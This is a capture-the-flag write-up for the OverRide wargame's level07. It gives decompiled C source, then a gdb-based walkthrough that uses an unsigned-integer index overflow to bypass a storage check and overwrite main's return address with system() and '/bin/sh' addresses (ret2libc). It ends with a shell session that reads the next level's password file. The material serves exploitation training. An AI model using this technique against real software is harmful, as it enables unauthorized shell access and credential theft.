# Level07

## Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>

void clear_stdin(void)
{
  char  c = 0;
  
  while (c != -1)
  {
    c = getchar();
    if (c == '\n') {
      return;
    }
  }
  return;
}

int get_unum(void)
{
  int local_10[4];
  
  local_10[0] = 0;
  fflush(stdout);
  scanf("%u",local_10);
  clear_stdin();
  return local_10[0];
}

int store_number(int *integer)
{
  unsigned int n;
  unsigned int index;
  
  printf(" Number: ");
  n = get_unum();
  printf(" Index: ");
  index = get_unum();
  if ((index % 3 == 0) || (n >> 24 == 183)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  }
  else {
    integer[index] = n;
    return 0;
  }
}

int read_number(int *integer)
{
  unsigned int n;
  
  printf(" Index: ");
  n = get_unum();
  printf(" Number at data[%u] is %u\n", n, integer[n]);
  return 0;
}


int main(int argc,char **argv,char **envp)
{
  int   read_ret = 0;
  char  buf[20] = {0};
  int   integer[100] = {0};

  for (char **i = argv; *i != (char *)0x0; i++) {
    memset(*i, 0, strlen(*i) - 1);
  }
  for (char **i = envp; *i != (char *)0x0; i++) {
    memset(*i, 0, strlen(*i) - 1);
  }
  puts(
      "----------------------------------------------------\n  Welcome to wil\'s crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
      );
  while (1) {
    printf("Input command: ");
    fgets(buf, 20, stdin);
    buf[strlen(buf) - 1] = 0;

    if (!strncmp(buf, "store", 5)) {
      read_ret = store_number(integer);
    }
    else if (!strncmp(buf, "read", 4)) {
      read_ret = read_number(integer);
    }
    else if (!strncmp(buf, "quit", 4)) {
      return 0;
    }
    if (read_ret == 0) {
      printf(" Completed %s command successfully\n", buf);
    }
    else {
      printf(" Failed to do %s command\n", buf);
    }
    memset(&buf, 0, 20);
  };
}
```

## Explanation

- This program allows the user to store number in an int array of length 100. It works with 3 commands : `store`, `read` and `quit`.

- Very quickly we realised that we could `store` and `read` information further than index 100, which made us think it would be possible to overwrite the return address of the main function. So our first goal was to find where this address was located in the stack.

- Thanks to gdb, we calculated the size of the main function's stack frame by:

   - substracting the value stored in esp from the value stored in ebp after setting a breakpoint at some point in the function : 4294956824 - 4294956336 = 488 bytes of stack frame.

   - Thanks to this line in disass main:`lea    0x24(%esp),%ebx`, we can see that the memory space of the int array[100] is located 36 bytes above esp.

   - We know that an array of 100 int takes 400 bytes, so if we add these 400 bytes to the 36 bytes offset from esp, we get the value 436. Still 52 (or 13 * 4) bytes away from ebp. We know our return address can normally be found at ebp + 4, therefore if we try to access the index 114 of our array, we should be able to modify the return address of our main function, to redirect the program where we need to when the command `quit` is given. 

- But there's another problem : the program implements some kind of protection on any index that is divisable by 3. The user can read these indexes but cannot store anything in them.

- By looking at how the program writes a value at an index: `*(uint *)(uVar2 * 4 + param_1) = uVar1;` we found a solution that consisted in using an unsigned int overflow to give a specific index that would not be divisible by 3 but would, once multiplied by four and being added our index, allow us to loop back to small values and fall back precisely on 114. Basically, uintmax / 4 + 114 + 1

- 4294967295 / 4 + 114 + 1 = 1073741938

- To make sure we fell on the right place, we tested this :
```
Input command: store
 Number: 0
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 0
 Completed read command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

- Clearly, we were able to store something at index 114, and this was indeed our return address !

- The first idea we had was to store our shellcode in an env variable, but we then realised that the program seems to implement some protection by calling `memset()` to replace our env variables by null bytes.

- One of the other options, probably the most simple one, was to try a ret2libc by replacing the return address at index 114 by the address of `system()` and storing at index 116 the address of the string "/bin/sh". We could leave whatever was in index 115 since we don't really care about the return address as long as we can start a shell.

- We found these two addresses this way :
   - command `p system` in gdb gave us the address 0xf7e6aed0 (4159090384 in decimal)
   - command `find __libc_start_main,+99999999,"/bin/sh"` in gdb gave us the address 0xf7f897ec (4160264172 in decimal)

- Now we have all the needed information !

## Exploit 

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
```